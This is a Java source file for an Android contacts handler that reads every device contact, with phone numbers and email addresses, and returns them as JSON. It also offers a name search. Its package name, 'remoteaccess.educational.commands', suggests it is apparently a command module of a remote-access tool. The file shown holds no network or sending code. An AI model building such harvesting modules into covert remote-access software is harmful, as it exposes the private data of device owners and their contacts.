package com.remoteaccess.educational.commands;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Contacts Handler - Read device contacts
 */
public class ContactsHandler {

    private Context context;

    public ContactsHandler(Context context) {
        this.context = context;
    }

    /**
     * Get all contacts
     */
    public JSONObject getAllContacts() {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_CONTACTS permission not granted");
                return result;
            }

            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );

            JSONArray contactsList = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    JSONObject contact = new JSONObject();
                    contact.put("id", id);
                    contact.put("name", name);
                    
                    // Get phone numbers
                    if (cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        JSONArray phones = getPhoneNumbers(id);
                        contact.put("phones", phones);
                    } else {
                        contact.put("phones", new JSONArray());
                    }
                    
                    // Get emails
                    JSONArray emails = getEmails(id);
                    contact.put("emails", emails);
                    
                    contactsList.put(contact);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("contacts", contactsList);
            result.put("count", contactsList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get phone numbers for a contact
     */
    private JSONArray getPhoneNumbers(String contactId) {
        JSONArray phones = new JSONArray();
        
        try {
            Cursor phoneCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                do {
                    String number = phoneCursor.getString(
                        phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    );
                    int type = phoneCursor.getInt(
                        phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE)
                    );
                    
                    JSONObject phone = new JSONObject();
                    phone.put("number", number);
                    phone.put("type", getPhoneType(type));
                    phones.put(phone);
                    
                } while (phoneCursor.moveToNext());
                
                phoneCursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return phones;
    }

    /**
     * Get emails for a contact
     */
    private JSONArray getEmails(String contactId) {
        JSONArray emails = new JSONArray();
        
        try {
            Cursor emailCursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (emailCursor != null && emailCursor.moveToFirst()) {
                do {
                    String email = emailCursor.getString(
                        emailCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)
                    );
                    emails.put(email);
                } while (emailCursor.moveToNext());
                
                emailCursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return emails;
    }

    /**
     * Get phone type name
     */
    private String getPhoneType(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "Work Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "Home Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "Other";
            default:
                return "Unknown";
        }
    }

    /**
     * Search contacts by name
     */
    public JSONObject searchContacts(String query) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "READ_CONTACTS permission not granted");
                return result;
            }

            String selection = ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?";
            String[] selectionArgs = new String[]{"%" + query + "%"};

            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                selection,
                selectionArgs,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );

            JSONArray contactsList = new JSONArray();
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    JSONObject contact = new JSONObject();
                    contact.put("id", id);
                    contact.put("name", name);
                    
                    if (cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        contact.put("phones", getPhoneNumbers(id));
                    }
                    
                    contact.put("emails", getEmails(id));
                    contactsList.put(contact);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }

            result.put("success", true);
            result.put("query", query);
            result.put("contacts", contactsList);
            result.put("count", contactsList.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }
}
